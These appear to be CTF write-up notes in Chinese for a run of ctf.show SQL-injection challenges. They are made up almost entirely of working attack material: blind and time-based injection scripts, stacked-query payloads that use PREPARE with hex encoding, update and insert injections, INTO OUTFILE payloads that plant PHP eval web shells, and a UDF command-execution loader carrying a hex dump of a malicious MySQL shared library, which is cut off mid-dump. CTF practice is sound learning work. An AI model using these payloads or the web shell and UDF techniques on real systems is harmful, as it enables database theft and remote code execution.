        data = {'u': f"if(ascii(substr(({payload}),{i},1))>{mid},username,'a')"}
        res = requests.get(url, params=data)
        if "userAUTO" in res.text:
            start = mid + 1
        else:
            tail = mid
    if start != 32:
        flag += chr(start)
    else:
        break
    print(flag)
```

# 223 numTrue(1) 

> 不能包含数字。可以使用 true 来绕过，一个 true 表示1，数字就用 true 来累加就可以了

```python
import requests 
url = 'http://5c2a899b-dfaa-42fa-84cb-7542c7f597de.challenge.ctf.show//api/'
flag = ''
i = 0

def numTrue(number):
    result = 'true'
    if number == 1:
        return result
    else:
        for index in range(number - 1):
            result += '+true'
        return result

while True:
    start = 32
    tail = 127
    i += 1
 
    while start < tail:
        mid = (start + tail) >> 1
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"
        payload = 'select concat(flagasabc) from ctfshow_flagas'
        data = {'u': f"if(ascii(substr(({payload}),{numTrue(i)},{numTrue(1)}))>{numTrue(mid)},username,'a')"}
        res = requests.get(url, params=data)
        if "userAUTO" in res.text:
            start = mid + 1
        else:
            tail = mid
    if start != 32:
        flag += chr(start)
    else:
        break
    print(flag)

```

# 224 这道题看答案都费劲 文件名注入

[答案](https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5)

```
1：robots.txt找到hint：
User-agent: *
Disallow: /pwdreset.php

2：登录/pwdreset.php重置admin密码
3：上传文件 群里下载payload.bin
4：改payload.bin里的一句话木马
5：上传
6：拿falg
```

# 225 堆叠注入

解法一：

handler open as

```sql
# 打开一个表名为 tbl_name 的表的句柄
HANDLER tbl_name OPEN [ [AS] alias]

# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]

# 2、通过索引查看表
# FIRST: 获取第一行（索引最小的一行）
# NEXT: 获取下一行
# PREV: 获取上一行
# LAST: 获取最后一行（索引最大的一行）
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]

# 3、不通过索引查看表
# READ FIRST: 获取句柄的第一行
# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

# 关闭已打开的句柄
HANDLER tbl_name CLOSE

```

payload

```
rname=';show tables;%23

?username=';handler `ctfshow_flagasa` open as hd;handler hd read first;%23
```

解法二：

预编译

> prepare用于预备一个语句，并赋予名称，以后可以引用该语句
> execute执行语句
> (deallocate|drop) prepare name用来释放掉预处理的语句(也可以不加)

payload

```sql
Prepare stmt from CONCAT('se','lect * from `ctfshow_flagasa`;');EXECUTE stmt;#
拆分开来如下：
Prepare stmt from CONCAT('se','lect * from `ctfshow_flagasa`;');
EXECUTE stmt;
#deallocate prepare stmt; #可以不加
#
```

# 226 228-230 Prepare EXECUTE

采用预编译的话因为`(`,不能用,concat用不了了,不过可以使用16进制代替,如果只是过滤引号的话可以用unhex()和hex()组合绕过,这里分享一下

```sql
'abc' 等价于unhex(hex(6e6+382179)); 可以用于绕过大数过滤（大数过滤：/\d{9}|0x[0-9a-f]{9}/i）
具体转换的步骤是：
  1. abc转成16进制是616263
  2. 616263转十进制是6382179
  3. 用科学计数法表示6e6+382179 
  4. 套上unhex(hex())，就是unhex(hex(6e6+382179));
```

payload

```sql
1：表名：
select hex('show tables');
查表名(也不用加注释;就相当于结束了sql语句了)

payload
?username=';Prepare stmt from 0x73686F77207461626C6573;EXECUTE stmt;

2：捞数据falg
select hex('select * from ctfsh_ow_flagas');

payload:
?username=';Prepare stmt from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE stmt;
```

# 227 堆叠注入 存储过程 routines

[存储过程](https://blog.csdn.net/qq_41573234/article/details/80411079)

> **存储过程的查看**
>
>  用 SHOW  STATUS 语句可以查看存储过程和函数的状态，其基本的语法结构如下:
>
>   **SHOW  { PROCEDURE  |  FUNCTION  } STATUS  [ LIKE 'pattern' ]**
>
>   SHOW STATUS 语句是 MySQL 的一个扩展。它返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。如果没有指定样式，根据使用的语句，所有的存储程序或存储函数的信息都会被列出。PROCEDURE 和 FUNCTION 分别表示查看存储过程和函数；LIKE 语句表示匹配存储过程或函数的名称。
>
> **查看存储过程的定义**
>
>   除了SHOW STATUS 之外，还可以使用  SHOW CREATE 语句查看存储过程和函数的状态。
>
>   **SHOW  CREATE  { PROCEDURE | FUNCTION } sp_name**
>
>   SHOW CREATE 语句是 MySQL 的一个扩展，类似于 SHOW CREATE TABLE, 它返回一个可用来重新创建已命名子程序的确切字符串。PROCEDURE 和 FUNCTION 分别表示查看存储过程和函数; LIKE 语句表示匹配存储过程或函数的名称。
>
> **查看存储过程和函数信息**
>
> 在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:
>
>   **SELECT  \*  FROM  information_schema.Routines**
>
>   WHERE  ROUTINE_NAME = '  sp_name ' ;
>
> 其中，ROUTINE_NAME 字段中存储的是存储过程和函数的名称;  sp_name 参数表示存储过程或函数的名称。

## routines

> SPECIFIC_NAME
>
> 例程的名称。
>
> ROUTINE_CATALOG
>
> 例程所属的目录的名称。此值始终为def。
>
> ROUTINE_SCHEMA
>
> 例程所属的模式(数据库)的名称。
>
> ROUTINE_NAME
>
> 例程的名称。
>
> ROUTINE_TYPE
>
> PROCEDURE用于存储过程， FUNCTION用于存储函数。
>
> DATA_TYPE
>
> 如果例程是存储的函数，则返回值数据类型。如果例程是存储过程，则此值为空。
>
> 该DATA_TYPE值仅是类型名称，没有其他信息。该 DTD_IDENTIFIER值包含类型名称以及可能的其他信息，例如精度或长度。
>
> CHARACTER_MAXIMUM_LENGTH
>
> 对于存储的函数字符串返回值，以字符为单位的最大长度。如果例程是存储过程，则此值为NULL。
>
> CHARACTER_OCTET_LENGTH
>
> 对于存储的函数字符串返回值，最大长度(以字节为单位)。如果例程是存储过程，则此值为 NULL。
>
> NUMERIC_PRECISION
>
> 对于存储的函数数字返回值，数字精度。如果例程是存储过程，则此值为 NULL。
>
> NUMERIC_SCALE
>
> 对于存储的函数数字返回值，数字刻度。如果例程是存储过程，则此值为 NULL。
>
> DATETIME_PRECISION
>
> 对于存储的函数的时间返回值，分数秒精度。如果例程是存储过程，则此值为NULL。
>
> CHARACTER_SET_NAME
>
> 对于存储的函数字符串返回值，字符集名称。如果例程是存储过程，则此值为NULL。
>
> COLLATION_NAME
>
> 对于存储的函数字符串返回值，归类名称。如果例程是存储过程，则此值为NULL。
>
> DTD_IDENTIFIER
>
> 如果例程是存储的函数，则返回值数据类型。如果例程是存储过程，则此值为空。
>
> 该DATA_TYPE值仅是类型名称，没有其他信息。该 DTD_IDENTIFIER值包含类型名称以及可能的其他信息，例如精度或长度。
>
> ROUTINE_BODY
>
> 例程定义所使用的语言。此值始终为SQL。
>
> ROUTINE_DEFINITION
>
> 例程执行的SQL语句的文本。
>
> EXTERNAL_NAME
>
> 此值始终为NULL。
>
> EXTERNAL_LANGUAGE
>
> 存储例程的语言。该值是从数据字典表的external_language列中 读取的 mysql.routines。
>
> PARAMETER_STYLE
>
> 此值始终为SQL。
>
> IS_DETERMINISTIC
>
> YES或NO，取决于例程是否使用DETERMINISTIC特性定义 。
>
> SQL_DATA_ACCESS
>
> 例程的数据访问特征。值中的一个CONTAINS SQL，NO SQL，READS SQL DATA，或 MODIFIES SQL DATA。
>
> SQL_PATH
>
> 此值始终为NULL。
>
> SECURITY_TYPE
>
> 常规SQL SECURITY特征。值为DEFINER或之一 INVOKER。
>
> CREATED
>
> 创建例程的日期和时间。这是一个 TIMESTAMP值。
>
> LAST_ALTERED
>
> 例程的最后修改日期和时间。这是一个TIMESTAMP值。如果例程自创建以来尚未修改，则该值与该CREATED值相同。
>
> SQL_MODE
>
> 创建或更改例程时有效的SQL模式，在该模式下执行例程。有关允许的值，请参见第5.1.11节“服务器SQL模式”。
>
> ROUTINE_COMMENT
>
> 注释文本(如果例程包含一个)。如果不是，则此值为空。
>
> DEFINER
>
> 在DEFINER子句中命名的帐户(通常是创建例程的用户)， 格式。 'user_name'@'host_name'
>
> CHARACTER_SET_CLIENT
>
> character_set_client创建例程时系统变量 的会话值 。
>
> COLLATION_CONNECTION
>
> collation_connection创建例程时系统变量 的会话值 。
>
> DATABASE_COLLATION
>
> 与例程相关联的数据库的整理。

payload

```sql
select hex('select * from information_schrma.routines')

payload
?username=';Prepare stmt from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;EXECUTE stmt;%
```

# 231 232 update注入

## 解法1：

思路修改查询出的数据

sql

```sql
 $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

查库表名

```sql
password=123',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&username=
```

查列名

```sql
password=123',username=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flaga')#&username=
```

查数据

```sql
password=123',username=(select group_concat(flagas) from flaga)#&username=
```

## 解法2

盲注

```python
# @Author:Kradress
import requests

url = "http://f50fecf3-250b-45f2-9c10-ada03b956fff.challenge.ctf.show/api/"
table_name = 'flaga'
flag = 'flagas'

result = ''

# 数据库名
# payload = "database()"
# 爆表名  
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆列名
# payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"
#爆字段值
payload = f"select {flag} from {table_name}"

for i in range(1,50):
    head = 32
    tail = 127

    while head < tail:

        #sleep(1)
        
        mid = (head + tail) >> 1 # 中间指针等于头尾指针相加的一半
        print(mid)
        data = {
            'username' : f"ctfshow' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(3),1)#",
            'password' : 0
        }
        try:
            r = requests.post(url, data, timeout=2.5)
            tail = mid 
        except:
            head = mid + 1 #sleep导致超时

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```

# 233 234 盲注

```python
# @Author:Kradress
import requests

url = "http://3a9c1e4a-a0c2-47c9-ac10-cc3e7645ea62.challenge.ctf.show/api/"
table_name = 'flag233333'
flag = 'flagass233'

result = ''

# 数据库名
# payload = "database()"
# 爆表名
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆列名
# payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"
# 爆字段值
payload = f"select {flag} from {table_name}"

for i in range(1, 50):
    head = 32
    tail = 127

    while head < tail:

        # sleep(1)

        mid = (head + tail) >> 1  # 中间指针等于头尾指针相加的一半
        # print(mid)
        data = {
            'username': f"ctfshow' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(3),1)#",
            'password': 0
        }
        try:
            r = requests.post(url, data, timeout=2.5)
            tail = mid
        except:
            head = mid + 1  # sleep导致超时

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```

# 235 sys或者mysql库代替infomation

查表名，sql

```
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();
select group_concat(table_name)from mysql.innodb_index_stats where database_name=database();
```

查表名payload

```
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
```

## [无名列盲注](https://kradress.github.io/2021/11/28/SQL%E6%B3%A8%E5%85%A5.html#%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8)

payload

```
password=\&username=,username=(select a.2 from (select 1,2,3 union select * from flag23a1 limit 1,1)a)#
password=\&username=,username=(select `2` from (select 1,2,3 union select * from flag23a1 limit 1,1)a)#
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
```

## [比较法盲注](https://kradress.github.io/2021/11/28/SQL%E6%B3%A8%E5%85%A5.html#%E6%AF%94%E8%BE%83%E6%B3%95%E7%9B%B2%E6%B3%A8)

```python
# @Author:Kradress
import requests
import string

url = "http://99c6146f-7390-4303-9c69-8bad06dfd783.challenge.ctf.show/api/"
table_name = 'flag23a1'

result = ''

def strToHex(S : str):
    parts = []
    for s in S:
        parts.append(str(hex(ord(s)))[2:])
    return '0x' + ''.join(parts)

uuid = string.ascii_lowercase+string.digits+"{-,_}"
# 数据库名
# payload = "database()"
# 爆表名  
# payload = "select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()"


for i in range(1,50):
    for j in range(32,128):
        data = {
            # 爆表名
            # 'username' : f" where username =  0x63746673686f77 and if(ascii(substr(({payload}),{i},1))={j},sleep(3),1)#",
            # 比较法盲注
            'username' : f" where username =  0x63746673686f77 and if(((select 0x31,{strToHex(result+chr(j))},{strToHex('!')})<(select * from {table_name} limit 0,1)),1,sleep(3))#",
            'password' : "\\"
        }
        print(i,data.get('username'))

        try:
            r = requests.post(url, data=data, timeout=2.5)
        except:
            result += chr(j-1) #sleep导致超时
            print(result)
            break

        if(j==127):
            break
```

# 236 过滤回显内容

sql

```
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

payload

```
拿表名
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
```

拿数据，编码

```
password=\&username=,username=(select to_base64(a.2) from (select 1,2 ,3 union select * from flaga limit 1,1)a)#
```

# 237 insert

原sql:

```sql
insert into ctfshow_user(username,pass) value('{$username}','{$password}');
```

username用\对‘进行转义

payload：

```sql
#查表名
username=as\&password=,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
#查字段
username=as\&password=,(select group_concat(column_name) from information_schema.columns where table_name='flag'));#
# 查flag
username=as\&password=,(select group_concat(flagass23s3) from flag));#
```

# 238 insert （）

原sql:

```sql
insert into ctfshow_user(username,pass) value('{$username}','{$password}');
```

username用\对‘进行转义

payload:

```
#查表名
username=as\&password=,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#
#查字段
username=as\&password=,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#
# 查flag
username=as\&password=,(select(group_concat(flagass23s3))from(flag));#
```

# 239 insert

原sql：

```
insert into ctfshow_user(username,pass) value('{$username}','{$password}');
```

payload:

```
#获取表名
username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)))%23&password=1

#获取数据
按照无列名注入的方法没出来
username=1',(select`1`from(select(1),(2),(3)union(select*from(flagbb)))as`a`))%23&password=1
盲猜一波flag
username=1',(select(flag)from(flagbb)))%23&password=1
```

# 240 insert py脚本

```python
import requests  
url="http://4607becd-20d4-49a4-a488-e20f06b3abe7.challenge.ctf.show/api/insert.php"
s='ab'
for i in s:
    for j in s:
        for k in s:  
            for l in s:  
                for m in s:
                    table='flag'+i+j+k+l+m 
                    data={'username':f"1',(select(flag)from({table})))#",
                    'password':'1'}
                    requests.post(url,data=data)
```

# 241delete 时间盲注

妈的，注不出来

```python
# @Author:yu22x
import requests
import time
import urllib.parse
url = "http://b37e7121-22c6-4917-bfa5-ddc38a0ed78f.challenge.ctf.show/api/delete.php"
s='0123456789abcdef-'
flag='ctfshow{'

for i in range(9,46):
		print(i)
		for j in s:
			data={'id':f'0||if(substr((select flag from flag),{i},1)="{j}",sleep(1),0)'}
			#print(data)
			try:
				requests.post(url,data=data,timeout=1)
			except:
				flag+=j  
				print(flag)
				break
			time.sleep(1)
```

# 242 file terminated by

select ... into outfile ...

```sql
SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]
 
export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]

/***********************************************************/

“OPTION”参数为可选参数选项，其可能的取值有：
 
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
 
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```

Payload:

```
filename=1.php' lines terminated by '<?php eval($_POST[1]);phpinfo();?>'%23
```

# 243 file starting by

payload

.user.ini

```
filename=.user.ini' lines starting by 'auto_append_file="a.png";'%23
```

1.png

```
filename=a.png' lines starting by '<?=eval($_POST[1]);?>'%23
```

# 244 245 error注入

[报错注入](http://t.zoukankan.com/Dleo-p-5493782.html)

以查询user为例：

> 六个函数
>
> GeometryCollection()
> id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))
>
> polygon()
> id =1 AND polygon((select * from(select * from(select user())a)b))
>
> multipoint()
> id = 1 AND multipoint((select * from(select * from(select user())a)b))
>
> multilinestring()
> id = 1 AND multilinestring((select * from(select * from(select user())a)b))
>
> linestring()
> id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
>
> multipolygon()
> id =1 AND multipolygon((select * from(select * from(select user())a)b))

payload

```
#获取表名
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23

#获取列名
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag')))%23

#获取flag（报错注入有长度限制，所以需要拼接下）
1'||extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from ctfshow_flag)))%23
1'||extractvalue(0x0a,concat(0x0a,(select right(group_concat(flag),20) from ctfshow_flag)))%23
```

# 246 error floor

==过滤updatexml extractvalue可以用floor==

payload

```
#获取表名
1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取列名
1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flags'  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取数据
1' union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

```

# 247 error ceil round floor

> Mysql取整函数
> 1.round
> 四舍五入取整
> round(s,n)：对s四舍五入保留n位小数,n取值可为正、负、零.
> 如四舍五入到整数位，则n取零.
>
> 2.ceil
> 向上取整
> ceil(s)：返回比s大的最小整数
>
> 3.floor
> 向下取整
> floor(s)：返回比s小的最大整数
>
> 直接把上一步的floor替换成ceil或者round即可。
> 有一点需要注意下，列名查出来是`flag?`，所以我们在查数据的时候要包个反引号

payload

```
1' union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa  limit 0,1),0x3a,0x3a, round(rand(0)*2))a from information_schema.columns group by a%23
```

# 248 UDF EVAL

定义自定义函数，并执行

> 将udf文件放到指定位置（Mysql>5.1放在Mysql根目录的lib\plugin文件夹下）
> 从udf文件中引入自定义函数(user defined function)
> 执行自定义函数
> `create function sys_eval returns string soname 'hack.so';`
> `select sys_eval('whoami');`
>
> 不过这道题是get传值，所以有长度限制，就得分段来传。
> 可以先生成多个文件，再通过concat拼接成完整的so文件。
> 恶意的so文件我们可以通过sqlmap中的文件得到，也可以通过光哥的博客`https://www.sqlsec.com/tools/udf.html`

so落地脚本

```python
import requests

url = "http://666399cc-c170-4027-9762-2ee8f740c646.challenge.ctf.show/api/"
payload = "?id=1';select '{}' into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+"
acquire = "?id=1';select load_file('/usr/lib/mariadb/plugin/{}.txt')--+"
text = ['a', 'b', 'c', 'd']

udf = "7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFF